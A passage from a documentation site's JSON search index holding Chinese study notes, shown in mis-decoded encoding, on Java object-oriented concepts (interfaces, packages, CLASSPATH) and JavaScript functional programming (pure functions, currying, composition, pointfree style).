æ–¹æ³•èƒ½å¤Ÿåœ¨åŒä¸€ä¸ªç±»ä¸­æˆ–è€…åœ¨ä¸€ä¸ªå­ç±»ä¸­è¢«é‡è½½ã€‚ æ— æ³•ä»¥è¿”å›å€¼ç±»å‹ä½œä¸ºé‡è½½å‡½æ•°çš„åŒºåˆ†æ ‡å‡†ã€‚  "},{"id":65,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/%E8%8F%9C%E9%B8%9F%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/3.%E5%A4%9A%E6%80%81/","title":"3.å¤šæ€","section":"èœé¸Ÿé¢å‘å¯¹è±¡","content":"å¤šæ€ #  http://www.runoob.com/java/java-polymorphism.html\n"},{"id":66,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/%E8%8F%9C%E9%B8%9F%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/4.%E6%8A%BD%E8%B1%A1%E7%B1%BB/","title":"4.æŠ½è±¡ç±»","section":"èœé¸Ÿé¢å‘å¯¹è±¡","content":"æŠ½è±¡ç±» #  http://www.runoob.com/java/java-abstraction.html\n"},{"id":67,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/%E8%8F%9C%E9%B8%9F%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/5.%E5%B0%81%E8%A3%85/","title":"5.å°è£…","section":"èœé¸Ÿé¢å‘å¯¹è±¡","content":"å°è£… #  http://www.runoob.com/java/java-encapsulation.html\n"},{"id":68,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/%E8%8F%9C%E9%B8%9F%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/6.%E6%8E%A5%E5%8F%A3/","title":"6.æ¥å£","section":"èœé¸Ÿé¢å‘å¯¹è±¡","content":"æ¥å£ #  æ¥å£ï¼ˆè‹±æ–‡ï¼šInterfaceï¼‰ï¼Œåœ¨ JAVA ç¼–ç¨‹è¯­è¨€ä¸­æ˜¯ä¸€ä¸ªæŠ½è±¡ç±»å‹ï¼Œæ˜¯æŠ½è±¡æ–¹æ³•çš„é›†åˆï¼Œæ¥å£é€šå¸¸ä»¥ interface æ¥å£°æ˜ã€‚ä¸€ä¸ªç±»é€šè¿‡ç»§æ‰¿æ¥å£çš„æ–¹å¼ï¼Œä»è€Œæ¥ç»§æ‰¿æ¥å£çš„æŠ½è±¡æ–¹æ³•ã€‚\n  æ¥å£å¹¶ä¸æ˜¯ç±»ï¼Œç¼–å†™æ¥å£çš„æ–¹å¼å’Œç±»å¾ˆç›¸ä¼¼ï¼Œä½†æ˜¯å®ƒä»¬å±äºä¸åŒçš„æ¦‚å¿µã€‚ç±»æè¿°å¯¹è±¡çš„å±æ€§å’Œæ–¹æ³•ã€‚æ¥å£åˆ™åŒ…å«ç±»è¦å®ç°çš„æ–¹æ³•ã€‚\n  é™¤éå®ç°æ¥å£çš„ç±»æ˜¯æŠ½è±¡ç±»ï¼Œå¦åˆ™è¯¥ç±»è¦å®šä¹‰æ¥å£ä¸­çš„æ‰€æœ‰æ–¹æ³•ã€‚\n  æ¥å£æ— æ³•è¢«å®ä¾‹åŒ–ï¼Œä½†æ˜¯å¯ä»¥è¢«å®ç°ã€‚ä¸€ä¸ªå®ç°æ¥å£çš„ç±»ï¼Œå¿…é¡»å®ç°æ¥å£å†…æ‰€æè¿°çš„æ‰€æœ‰æ–¹æ³•ï¼Œå¦åˆ™å°±å¿…é¡»å£°æ˜ä¸ºæŠ½è±¡ç±»ã€‚\n  å¦å¤–ï¼Œåœ¨ Java ä¸­ï¼Œæ¥å£ç±»å‹å¯ç”¨æ¥å£°æ˜ä¸€ä¸ªå˜é‡ï¼Œä»–ä»¬å¯ä»¥æˆä¸ºä¸€ä¸ªç©ºæŒ‡é’ˆï¼Œæˆ–æ˜¯è¢«ç»‘å®šåœ¨ä¸€ä¸ªä»¥æ­¤æ¥å£å®ç°çš„å¯¹è±¡ã€‚\n  æ¥å£ç‰¹æ€§ï¼š\n  æ¥å£ä¸­æ¯ä¸€ä¸ªæ–¹æ³•ä¹Ÿæ˜¯éšå¼æŠ½è±¡çš„,æ¥å£ä¸­çš„æ–¹æ³•ä¼šè¢«éšå¼çš„æŒ‡å®šä¸º public abstractï¼ˆåªèƒ½æ˜¯ public abstractï¼Œå…¶ä»–ä¿®é¥°ç¬¦éƒ½ä¼šæŠ¥é”™ï¼‰ã€‚\n  æ¥å£ä¸­å¯ä»¥å«æœ‰å˜é‡ï¼Œä½†æ˜¯æ¥å£ä¸­çš„å˜é‡ä¼šè¢«éšå¼çš„æŒ‡å®šä¸º public static final å˜é‡ï¼ˆå¹¶ä¸”åªèƒ½æ˜¯ publicï¼Œç”¨ private ä¿®é¥°ä¼šæŠ¥ç¼–è¯‘é”™è¯¯ï¼‰ã€‚\n  æ¥å£ä¸­çš„æ–¹æ³•æ˜¯ä¸èƒ½åœ¨æ¥å£ä¸­å®ç°çš„ï¼Œåªèƒ½ç”±å®ç°æ¥å£çš„ç±»æ¥å®ç°æ¥å£ä¸­çš„æ–¹æ³•ã€‚\n  æŠ½è±¡ç±»å’Œæ¥å£çš„åŒºåˆ«ï¼š\n  æŠ½è±¡ç±»ä¸­çš„æ–¹æ³•å¯ä»¥æœ‰æ–¹æ³•ä½“ï¼Œå°±æ˜¯èƒ½å®ç°æ–¹æ³•çš„å…·ä½“åŠŸèƒ½ï¼Œä½†æ˜¯æ¥å£ä¸­çš„æ–¹æ³•ä¸è¡Œã€‚\n  æŠ½è±¡ç±»ä¸­çš„æˆå‘˜å˜é‡å¯ä»¥æ˜¯å„ç§ç±»å‹çš„ï¼Œè€Œæ¥å£ä¸­çš„æˆå‘˜å˜é‡åªèƒ½æ˜¯ public static final ç±»å‹çš„ã€‚\n  æ¥å£ä¸­ä¸èƒ½å«æœ‰é™æ€ä»£ç å—ä»¥åŠé™æ€æ–¹æ³•(ç”¨ static ä¿®é¥°çš„æ–¹æ³•)ï¼Œè€ŒæŠ½è±¡ç±»æ˜¯å¯ä»¥æœ‰é™æ€ä»£ç å—å’Œé™æ€æ–¹æ³•ã€‚\n  ä¸€ä¸ªç±»åªèƒ½ç»§æ‰¿ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œè€Œä¸€ä¸ªç±»å´å¯ä»¥å®ç°å¤šä¸ªæ¥å£ã€‚\n  å£°æ˜ #  æ¥å£çš„å£°æ˜è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š\n[å¯è§åº¦] interface æ¥å£åç§° [extends å…¶ä»–çš„æ¥å£åå] {  // å£°æ˜å˜é‡  // æŠ½è±¡æ–¹æ³• }  æ¥å£æ˜¯éšå¼æŠ½è±¡çš„ï¼Œå½“å£°æ˜ä¸€ä¸ªæ¥å£çš„æ—¶å€™ï¼Œä¸å¿…ä½¿ç”¨ abstract å…³é”®å­—ã€‚ æ¥å£ä¸­æ¯ä¸€ä¸ªæ–¹æ³•ä¹Ÿæ˜¯éšå¼æŠ½è±¡çš„ï¼Œå£°æ˜æ—¶åŒæ ·ä¸éœ€è¦ abstract å…³é”®å­—ã€‚ æ¥å£ä¸­çš„æ–¹æ³•éƒ½æ˜¯å…¬æœ‰çš„ã€‚  å®ç° #  å½“ç±»å®ç°æ¥å£çš„æ—¶å€™ï¼Œç±»è¦å®ç°æ¥å£ä¸­æ‰€æœ‰çš„æ–¹æ³•ã€‚å¦åˆ™ï¼Œç±»å¿…é¡»å£°æ˜ä¸ºæŠ½è±¡çš„ç±»ã€‚\nç±»ä½¿ç”¨ implements å…³é”®å­—å®ç°æ¥å£ã€‚åœ¨ç±»å£°æ˜ä¸­ï¼ŒImplements å…³é”®å­—æ”¾åœ¨ class å£°æ˜åé¢ã€‚\nå®ç°ä¸€ä¸ªæ¥å£çš„è¯­æ³•ï¼Œå¯ä»¥ä½¿ç”¨è¿™ä¸ªå…¬å¼ï¼š\n...implements æ¥å£åç§°[, å…¶ä»–æ¥å£åç§°, å…¶ä»–æ¥å£åç§°..., ...] ... é‡å†™æ¥å£ä¸­å£°æ˜çš„æ–¹æ³•æ—¶ï¼Œéœ€è¦æ³¨æ„ä»¥ä¸‹è§„åˆ™ï¼š\n ç±»åœ¨å®ç°æ¥å£çš„æ–¹æ³•æ—¶ï¼Œä¸èƒ½æŠ›å‡ºå¼ºåˆ¶æ€§å¼‚å¸¸ï¼Œåªèƒ½åœ¨æ¥å£ä¸­ï¼Œæˆ–è€…ç»§æ‰¿æ¥å£çš„æŠ½è±¡ç±»ä¸­æŠ›å‡ºè¯¥å¼ºåˆ¶æ€§å¼‚å¸¸ã€‚ ç±»åœ¨é‡å†™æ–¹æ³•æ—¶è¦ä¿æŒä¸€è‡´çš„æ–¹æ³•åï¼Œå¹¶ä¸”åº”è¯¥ä¿æŒç›¸åŒæˆ–è€…ç›¸å…¼å®¹çš„è¿”å›å€¼ç±»å‹ã€‚ å¦‚æœå®ç°æ¥å£çš„ç±»æ˜¯æŠ½è±¡ç±»ï¼Œé‚£ä¹ˆå°±æ²¡å¿…è¦å®ç°è¯¥æ¥å£çš„æ–¹æ³•ã€‚  åœ¨å®ç°æ¥å£çš„æ—¶å€™ï¼Œä¹Ÿè¦æ³¨æ„ä¸€äº›è§„åˆ™ï¼š\n ä¸€ä¸ªç±»å¯ä»¥åŒæ—¶å®ç°å¤šä¸ªæ¥å£ã€‚ ä¸€ä¸ªç±»åªèƒ½ç»§æ‰¿ä¸€ä¸ªç±»ï¼Œä½†æ˜¯èƒ½å®ç°å¤šä¸ªæ¥å£ã€‚ ä¸€ä¸ªæ¥å£èƒ½ç»§æ‰¿å¦ä¸€ä¸ªæ¥å£ï¼Œè¿™å’Œç±»ä¹‹é—´çš„ç»§æ‰¿æ¯”è¾ƒç›¸ä¼¼ã€‚  æ ‡è®°æ¥å£ #  æœ€å¸¸ç”¨çš„ç»§æ‰¿æ¥å£æ˜¯æ²¡æœ‰åŒ…å«ä»»ä½•æ–¹æ³•çš„æ¥å£ã€‚\næ ‡è®°æ¥å£æ˜¯æ²¡æœ‰ä»»ä½•æ–¹æ³•å’Œå±æ€§çš„æ¥å£.å®ƒä»…ä»…è¡¨æ˜å®ƒçš„ç±»å±äºä¸€ä¸ªç‰¹å®šçš„ç±»å‹,ä¾›å…¶ä»–ä»£ç æ¥æµ‹è¯•å…è®¸åšä¸€äº›äº‹æƒ…ã€‚\næ ‡è®°æ¥å£ä½œç”¨ï¼šç®€å•å½¢è±¡çš„è¯´å°±æ˜¯ç»™æŸä¸ªå¯¹è±¡æ‰“ä¸ªæ ‡ï¼ˆç›–ä¸ªæˆ³ï¼‰ï¼Œä½¿å¯¹è±¡æ‹¥æœ‰æŸä¸ªæˆ–æŸäº›ç‰¹æƒã€‚\nä¾‹å¦‚ï¼šjava.awt.event åŒ…ä¸­çš„ MouseListener æ¥å£ç»§æ‰¿çš„ java.util.EventListener æ¥å£å®šä¹‰å¦‚ä¸‹ï¼š\npackage java.util; public interface EventListener {} æ²¡æœ‰ä»»ä½•æ–¹æ³•çš„æ¥å£è¢«ç§°ä¸ºæ ‡è®°æ¥å£ã€‚æ ‡è®°æ¥å£ä¸»è¦ç”¨äºä»¥ä¸‹ä¸¤ç§ç›®çš„ï¼š\n å»ºç«‹ä¸€ä¸ªå…¬å…±çš„çˆ¶æ¥å£ï¼šæ­£å¦‚ EventListener æ¥å£ï¼Œè¿™æ˜¯ç”±å‡ åä¸ªå…¶ä»–æ¥å£æ‰©å±•çš„ Java APIï¼Œä½ å¯ä»¥ä½¿ç”¨ä¸€ä¸ªæ ‡è®°æ¥å£æ¥å»ºç«‹ä¸€ç»„æ¥å£çš„çˆ¶æ¥å£ã€‚ä¾‹å¦‚ï¼šå½“ä¸€ä¸ªæ¥å£ç»§æ‰¿äº† EventListener æ¥å£ï¼ŒJava è™šæ‹Ÿæœº (JVM) å°±çŸ¥é“è¯¥æ¥å£å°†è¦è¢«ç”¨äºä¸€ä¸ªäº‹ä»¶çš„ä»£ç†æ–¹æ¡ˆã€‚ å‘ä¸€ä¸ªç±»æ·»åŠ æ•°æ®ç±»å‹ï¼šè¿™ç§æƒ…å†µæ˜¯æ ‡è®°æ¥å£æœ€åˆçš„ç›®çš„ï¼Œå®ç°æ ‡è®°æ¥å£çš„ç±»ä¸éœ€è¦å®šä¹‰ä»»ä½•æ¥å£æ–¹æ³•ï¼ˆå› ä¸ºæ ‡è®°æ¥å£æ ¹æœ¬å°±æ²¡æœ‰æ–¹æ³•ï¼‰ï¼Œä½†æ˜¯è¯¥ç±»é€šè¿‡å¤šæ€æ€§å˜æˆä¸€ä¸ªæ¥å£ç±»å‹ã€‚  "},{"id":69,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/%E8%8F%9C%E9%B8%9F%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/7.%E5%8C%85/","title":"7.åŒ…","section":"èœé¸Ÿé¢å‘å¯¹è±¡","content":"åŒ… (package) #  ä¸ºäº†æ›´å¥½åœ°ç»„ç»‡ç±»ï¼ŒJava æä¾›äº†åŒ…æœºåˆ¶ï¼Œç”¨äºåŒºåˆ«ç±»åçš„å‘½åç©ºé—´ã€‚\nåŒ…çš„ä½œç”¨ï¼š\n  æŠŠåŠŸèƒ½ç›¸ä¼¼æˆ–ç›¸å…³çš„ç±»æˆ–æ¥å£ç»„ç»‡åœ¨åŒä¸€ä¸ªåŒ…ä¸­ï¼Œæ–¹ä¾¿ç±»çš„æŸ¥æ‰¾å’Œä½¿ç”¨ã€‚\n  å¦‚åŒæ–‡ä»¶å¤¹ä¸€æ ·ï¼ŒåŒ…ä¹Ÿé‡‡ç”¨äº†æ ‘å½¢ç›®å½•çš„å­˜å‚¨æ–¹å¼ã€‚åŒä¸€ä¸ªåŒ…ä¸­çš„ç±»åå­—æ˜¯ä¸åŒçš„ï¼Œä¸åŒçš„åŒ…ä¸­çš„ç±»çš„åå­—æ˜¯å¯ä»¥ç›¸åŒçš„ï¼Œå½“åŒæ—¶è°ƒç”¨ä¸¤ä¸ªä¸åŒåŒ…ä¸­ç›¸åŒç±»åçš„ç±»æ—¶ï¼Œåº”è¯¥åŠ ä¸ŠåŒ…ååŠ ä»¥åŒºåˆ«ã€‚å› æ­¤ï¼ŒåŒ…å¯ä»¥é¿å…åå­—å†²çªã€‚\n  åŒ…ä¹Ÿé™å®šäº†è®¿é—®æƒé™ï¼Œæ‹¥æœ‰åŒ…è®¿é—®æƒé™çš„ç±»æ‰èƒ½è®¿é—®æŸä¸ªåŒ…ä¸­çš„ç±»ã€‚\n  Java ä½¿ç”¨åŒ…ï¼ˆpackageï¼‰è¿™ç§æœºåˆ¶æ˜¯ä¸ºäº†é˜²æ­¢å‘½åå†²çªï¼Œè®¿é—®æ§åˆ¶ï¼Œæä¾›æœç´¢å’Œå®šä½ç±»ï¼ˆclassï¼‰ã€æ¥å£ã€æšä¸¾ï¼ˆenumerationsï¼‰å’Œæ³¨é‡Šï¼ˆannotationï¼‰ç­‰ã€‚\nåŒ…è¯­å¥çš„è¯­æ³•æ ¼å¼ä¸ºï¼š\npackage pkg1[ï¼pkg2[ï¼pkg3â€¦]]; ä¸€ä¸ªåŒ…ï¼ˆpackageï¼‰å¯ä»¥å®šä¹‰ä¸ºä¸€ç»„ç›¸äº’è”ç³»çš„ç±»å‹ï¼ˆç±»ã€æ¥å£ã€æšä¸¾å’Œæ³¨é‡Šï¼‰ï¼Œä¸ºè¿™äº›ç±»å‹æä¾›è®¿é—®ä¿æŠ¤å’Œå‘½åç©ºé—´ç®¡ç†çš„åŠŸèƒ½ã€‚\nä»¥ä¸‹æ˜¯ä¸€äº› Java ä¸­çš„åŒ…ï¼š\n java.lang-æ‰“åŒ…åŸºç¡€çš„ç±» java.io-åŒ…å«è¾“å…¥è¾“å‡ºåŠŸèƒ½çš„å‡½æ•°  package ç›®å½•ç»“æ„ #  ç±»æ”¾åœ¨åŒ…ä¸­ä¼šæœ‰ä¸¤ç§ä¸»è¦çš„ç»“æœï¼š\n åŒ…åæˆä¸ºç±»åçš„ä¸€éƒ¨åˆ†ï¼Œæ­£å¦‚æˆ‘ä»¬å‰é¢è®¨è®ºçš„ä¸€æ ·ã€‚ åŒ…åå¿…é¡»ä¸ç›¸åº”çš„å­—èŠ‚ç æ‰€åœ¨çš„ç›®å½•ç»“æ„ç›¸å»åˆã€‚  ä¾‹å¦‚ï¼šæœ‰ä¸€ä¸ª com.runoob.test çš„åŒ…ï¼Œè¿™ä¸ªåŒ…åŒ…å«ä¸€ä¸ªå«åš Runoob.java çš„æºæ–‡ä»¶ï¼Œé‚£ä¹ˆç›¸åº”çš„ï¼Œåº”è¯¥æœ‰å¦‚ä¸‹é¢çš„ä¸€è¿ä¸²å­ç›®å½•ï¼š\n....\\com\\runoob\\test\\Runoob.java ç¼–è¯‘çš„æ—¶å€™ï¼Œç¼–è¯‘å™¨ä¸ºåŒ…ä¸­å®šä¹‰çš„æ¯ä¸ªç±»ã€æ¥å£ç­‰ç±»å‹å„åˆ›å»ºä¸€ä¸ªä¸åŒçš„è¾“å‡ºæ–‡ä»¶ï¼Œè¾“å‡ºæ–‡ä»¶çš„åå­—å°±æ˜¯è¿™ä¸ªç±»å‹çš„åå­—ï¼Œå¹¶åŠ ä¸Š .class ä½œä¸ºæ‰©å±•åç¼€ã€‚ ä¾‹å¦‚ï¼š\n// æ–‡ä»¶å: Runoob.java  package com.runoob.test; public class Runoob {  } class Google {  } ç°åœ¨ï¼Œæˆ‘ä»¬ç”¨-dé€‰é¡¹æ¥ç¼–è¯‘è¿™ä¸ªæ–‡ä»¶ï¼Œå¦‚ä¸‹ï¼š\n$ javac -d . Runoob.java è¿™æ ·ä¼šåƒä¸‹é¢è¿™æ ·æ”¾ç½®ç¼–è¯‘äº†çš„æ–‡ä»¶ï¼š\n.\\com\\runoob\\test\\Runoob.class .\\com\\runoob\\test\\Google.class ç¼–è¯‘ä¹‹åçš„ .class æ–‡ä»¶åº”è¯¥å’Œ .java æºæ–‡ä»¶ä¸€æ ·ï¼Œå®ƒä»¬æ”¾ç½®çš„ç›®å½•åº”è¯¥è·ŸåŒ…çš„åå­—å¯¹åº”èµ·æ¥ã€‚ä½†æ˜¯ï¼Œå¹¶ä¸è¦æ±‚ .class æ–‡ä»¶çš„è·¯å¾„è·Ÿç›¸åº”çš„ .java çš„è·¯å¾„ä¸€æ ·ã€‚ä½ å¯ä»¥åˆ†å¼€æ¥å®‰æ’æºç å’Œç±»çš„ç›®å½•ã€‚\n\u0026lt;path-one\u0026gt;\\sources\\com\\runoob\\test\\Runoob.java \u0026lt;path-two\u0026gt;\\classes\\com\\runoob\\test\\Google.class è¿™æ ·ï¼Œä½ å¯ä»¥å°†ä½ çš„ç±»ç›®å½•åˆ†äº«ç»™å…¶ä»–çš„ç¼–ç¨‹äººå‘˜ï¼Œè€Œä¸ç”¨é€éœ²è‡ªå·±çš„æºç ã€‚ç”¨è¿™ç§æ–¹æ³•ç®¡ç†æºç å’Œç±»æ–‡ä»¶å¯ä»¥è®©ç¼–è¯‘å™¨å’Œ java è™šæ‹Ÿæœºï¼ˆJVMï¼‰å¯ä»¥æ‰¾åˆ°ä½ ç¨‹åºä¸­ä½¿ç”¨çš„æ‰€æœ‰ç±»å‹ã€‚\nç±»ç›®å½•çš„ç»å¯¹è·¯å¾„å«åš class pathã€‚è®¾ç½®åœ¨ç³»ç»Ÿå˜é‡ CLASSPATH ä¸­ã€‚ç¼–è¯‘å™¨å’Œ java è™šæ‹Ÿæœºé€šè¿‡å°† package åå­—åŠ åˆ° class path åæ¥æ„é€  .class æ–‡ä»¶çš„è·¯å¾„ã€‚\n\u0026lt;path- two\u0026gt;\\classes æ˜¯ class pathï¼Œpackage åå­—æ˜¯ com.runoob.testï¼Œè€Œç¼–è¯‘å™¨å’Œ JVM ä¼šåœ¨ \u0026lt;path-two\u0026gt;\\classes\\com\\runoob\\test ä¸­æ‰¾ .class æ–‡ä»¶ã€‚\nä¸€ä¸ª class path å¯èƒ½ä¼šåŒ…å«å¥½å‡ ä¸ªè·¯å¾„ï¼Œå¤šè·¯å¾„åº”è¯¥ç”¨åˆ†éš”ç¬¦åˆ†å¼€ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œç¼–è¯‘å™¨å’Œ JVM æŸ¥æ‰¾å½“å‰ç›®å½•ã€‚JAR æ–‡ä»¶æŒ‰åŒ…å« Java å¹³å°ç›¸å…³çš„ç±»ï¼Œæ‰€ä»¥ä»–ä»¬çš„ç›®å½•é»˜è®¤æ”¾åœ¨äº† class path ä¸­ã€‚\nè®¾ç½® CLASSPATH #  ç”¨ä¸‹é¢çš„å‘½ä»¤æ˜¾ç¤ºå½“å‰çš„ CLASSPATH å˜é‡ï¼š\n  Windows å¹³å°ï¼ˆDOS å‘½ä»¤è¡Œä¸‹ï¼‰\n\u0026gt; set CLASSPATH   UNIX å¹³å°ï¼ˆBourne shell ä¸‹ï¼‰\n$ echo $CLASSPATH   åˆ é™¤å½“å‰ CLASSPATH å˜é‡å†…å®¹ï¼š\n  Windows å¹³å°ï¼ˆDOS å‘½ä»¤è¡Œä¸‹ï¼‰\n\u0026gt; set CLASSPATH=   UNIX å¹³å°ï¼ˆBourne shell ä¸‹ï¼‰ï¼š\n$ unset CLASSPATH; export CLASSPATH   è®¾ç½® CLASSPATH å˜é‡ï¼š\n  Windows å¹³å°ï¼ˆDOS å‘½ä»¤è¡Œä¸‹ï¼‰ï¼š\n\u0026gt; set CLASSPATH=C:\\users\\jack\\java\\classes   UNIX å¹³å°ï¼ˆBourne shell ä¸‹ï¼‰ï¼š\n$ CLASSPATH=/home/jack/java/classes; export CLASSPATH   "},{"id":70,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/functional/1.basic/","title":"1. Basic","section":"functional","content":"å‡½æ•°å¼ç¼–ç¨‹å…¥é—¨ #  çº¯å‡½æ•° #  ä»€ä¹ˆæ˜¯çº¯å‡½æ•°ï¼Ÿ\n çº¯å‡½æ•°ï¼šç›¸åŒçš„è¾“å…¥ï¼Œæ°¸è¿œä¼šå¾—åˆ°ç›¸åŒçš„è¾“å‡ºï¼Œè€Œä¸”æ²¡æœ‰ä»»ä½•å¯è§‚å¯Ÿçš„å‰¯ä½œç”¨ã€‚  ä¸ºä»€ä¹ˆè¦è¿½æ±‚çº¯å‡½æ•°ï¼Ÿ\n å¯ç¼“å­˜æ€§ï¼ˆCacheableï¼‰ï¼šJavaScript ä¸­åº”ç”¨æœ€å¹¿æ³›çš„åº“ä¸º memoizeeï¼› å¯ç§»æ¤æ€§ï¼ˆPortableï¼‰ï¼šå¯ç§»æ¤æ€§å¯ä»¥æ„å‘³ç€æŠŠå‡½æ•°åºåˆ—åŒ–ã€‚ä¸ä¹‹ç›¸å¯¹çš„æ˜¯é¢å‘å¯¹è±¡è¯­è¨€ï¼Œç§»æ¤ä¸€ä¸ªå¯¹è±¡é€šå¸¸éœ€è¦å°†æ•´ä¸ªåºå¤§çš„ä½“ç³»è¿ç§»ï¼Œè¿™ä¹Ÿæ˜¯ JavaScript æ‹¥æœ‰å¼ºå¤§çš„ç»„ä»¶åŒ–ç”Ÿæ€çš„åŸå› ã€‚ è‡ªæ–‡æ¡£åŒ–ï¼ˆSelf-Documentingï¼‰ï¼šä¸éœ€è¦è¿‡å¤šçš„ Context æ¥æè¿°å‡½æ•°æ‰§è¡Œå‰ã€æ‰§è¡Œåçš„æ•ˆæœï¼› å¯æµ‹è¯•æ€§ï¼ˆTestableï¼‰ï¼šQuickcheckï¼Œä¸€ä¸ªä¸ºå‡½æ•°å¼ç¯å¢ƒé‡èº«å®šåˆ¶çš„æµ‹è¯•å·¥å…·ã€‚ å¼•ç”¨é€æ˜æ€§ï¼ˆReferential Transparencyï¼‰ï¼šå¦‚æœä¸€ä¸ªå‡½æ•°è°ƒç”¨å¯ä»¥å®Œå…¨ç”¨å®ƒçš„è¿”å›å€¼ä»£æ›¿ï¼Œé‚£ä¹ˆç§°è¿™ä¸ªå‡½æ•°æ—¶å¼•ç”¨é€æ˜çš„ã€‚  æŸ¯é‡ŒåŒ– (Curry) #  Curry çš„æ¦‚å¿µï¼š\n åªä¼ é€’ç»™å‡½æ•°ä¸€éƒ¨åˆ†å‚æ•°æ¥è°ƒç”¨å®ƒï¼Œè®©å®ƒè¿”å›ä¸€ä¸ªå‡½æ•°å»å¤„ç†å‰©ä¸‹çš„å‚æ•°ã€‚  æŸ¯é‡ŒåŒ–å‡½æ•°çš„ç®€å•å®ç°ï¼š\nvar curry = fn =\u0026gt; function $curry(...args) {  return (args.length \u0026lt; fn.length) ? $curry.bind(null, ...args) : fn.call(null, ...args); } å‡½æ•°ç»„åˆ (Compose) #  ä»¥ä¸‹çš„æ“ä½œç§°ä½œä¸ºä¸¤ä¸ªå‡½æ•° fã€g çš„ç»„åˆï¼ˆç›¸å½“äºæ•°å­¦ä¸­çš„å¤åˆå‡½æ•°ï¼‰ï¼š\nvar compose = (f,g) =\u0026gt; ( (x) =\u0026gt; f(g(x)) ); JavaScript ä¸­æœ‰ä¸€ä¸ªä¸ºäº†å‡½æ•°å¼ç¼–ç¨‹è®¾è®¡çš„åº“å°±èšåˆäº† composeã€curry ç­‰å‡½æ•°ï¼šramda\næœ‰ä¸€ä¸ªä¸ç»„åˆç†å¿µç›¸å…³çš„ä¸€ç§è®¾è®¡æ¨¡å¼ï¼Œå« Pointfreeï¼š\n Pointfreeï¼šæˆ–ç§°éšå½¢ç¼–ç¨‹ï¼Œæ˜¯ä¸€ç§åªå…³å¿ƒå‡½æ•°å®ç°è€Œå¹¶ä¸å…³å¿ƒå…·ä½“å‚æ•°çš„è®¾è®¡æ¨¡å¼ï¼Œåœ¨å®é™…å¼€å‘è¿‡ç¨‹ä¸­é€šå¸¸ä¸éœ€è¦æŠŠå‡½æ•°çš„å‚æ•°æ˜¾å¼åœ°è¡¨ç°å‡ºæ¥ï¼Œæ‰€ä»¥ä»£ç é€šå¸¸çœ‹èµ·æ¥ä¼šæ›´åŠ ç®€æ´ï¼› ä¸‹é¢æ˜¯ä¸€ä¸ªç”¨ Pointfree è®¾è®¡æ¨¡å¼ä¼˜åŒ–ä»£ç çš„ä¾‹å­ï¼š  // é€šå¸¸æ€ç»´çš„ä»£ç  var snakeCase = word =\u0026gt; word.toLowerCase().replace(/\\s+/ig, \u0026#39;_\u0026#39;);  // Pointfree æ–¹å¼ç¼–å†™çš„ä»£ç  var snakeCase = compose(replace(/\\s+/ig, \u0026#39;_\u0026#39;), toLowerCase);  å¯ä»¥çœ‹åˆ°ç”¨ Pointfree çš„è®¾è®¡æ¨¡å¼ä¼˜åŒ–ä¹‹åï¼Œword è¿™ä¸ªå‚æ•°å°±ä¸éœ€è¦åœ¨å‡½æ•°å®šä¹‰æ—¶æ˜¾å¼å£°æ˜å‡ºæ¥äº†ï¼›  PostScriptï¼š\n å°æŠ€å·§ï¼šcompose å‡½æ•°çš„é˜…è¯»æœ‰ç‚¹ç±»ä¼¼äºçŸ©é˜µçš„ä¹˜æ³•ï¼Œå¦‚æœæƒ³çŸ¥é“è¿”å›å‡½æ•°çš„ç­¾åï¼Œåªéœ€è¦çŸ¥é“ç¬¬ä¸€ä¸ªå‡½æ•°çš„å‚æ•°å’Œæœ€åä¸€ä¸ªå‡½æ•°çš„è¿”å›å€¼å³å¯ã€‚  èŒƒç•´è®º (Category Theory) #  æ•°å­¦ä¸Šæœ‰ä¸€ä¸ªåˆ†æ”¯â€˜èŒƒç•´è®ºâ€œé€šè¿‡ç ”ç©¶ä¸€ç³»åˆ—æŠ½è±¡çš„æ¦‚å¿µå½¢å¼åŒ–åœ°ç»Ÿä¸€äº†é›†åˆè®ºã€ç±»å‹è®ºã€ç¾¤è®ºç­‰ä¸åŒçš„åˆ†æ”¯ã€‚\nèŒƒç•´è®ºä¸­å®šä¹‰äº† categoryï¼Œå®ƒè¢«å®šä¹‰ä¸ºä»¥ä¸‹ç»„ä»¶çš„æŠ½è±¡é›†åˆï¼š\n A collection of objectsï¼šå¯¹è±¡çš„é›†åˆã€‚æ¯”å¦‚ Boolean ç±»å‹å¯ä»¥ç†è§£ä¸º true/false çš„é›†åˆï¼› A collection of morphismï¼šæ˜ å°„çš„é›†åˆã€‚æ¯”å¦‚æˆ‘ä»¬åœ¨ä¸Šé¢æåˆ°çš„çº¯å‡½æ•°ï¼Œå°±æ˜¯æˆ‘ä»¬ä¸»è¦ç ”ç©¶çš„æ˜ å°„ï¼› A notion of composition on the morphismï¼šæ˜ å°„çš„ç»„åˆã€‚å°±æ˜¯æˆ‘ä»¬åœ¨å‰é¢æåˆ°çš„ compose æ“ä½œï¼› A distinguished morphism called identityï¼šä¸€ä¸ªç‰¹æ®Šçš„æ˜ å°„ï¼Œæ’ç­‰æ˜ å°„ã€‚åœ¨ç»„åˆå…³ç³»ä¸­æ’ç­‰æ˜ å°„å³ä¸ºå‡½æ•° id = x =\u0026gt; xã€‚  Hindley-Milner ç±»å‹ç³»ç»Ÿ #  ä»€ä¹ˆæ˜¯ç±»å‹ï¼š\n å‡½æ•°ç­¾ååœ¨è¿™ä¸ªç±»å‹ç³»ç»Ÿä¸­å¯ä»¥è¢«è®¤ä¸ºæ˜¯â€œç±»å‹åˆ°ç±»å‹çš„æ˜ å°„â€ã€‚ 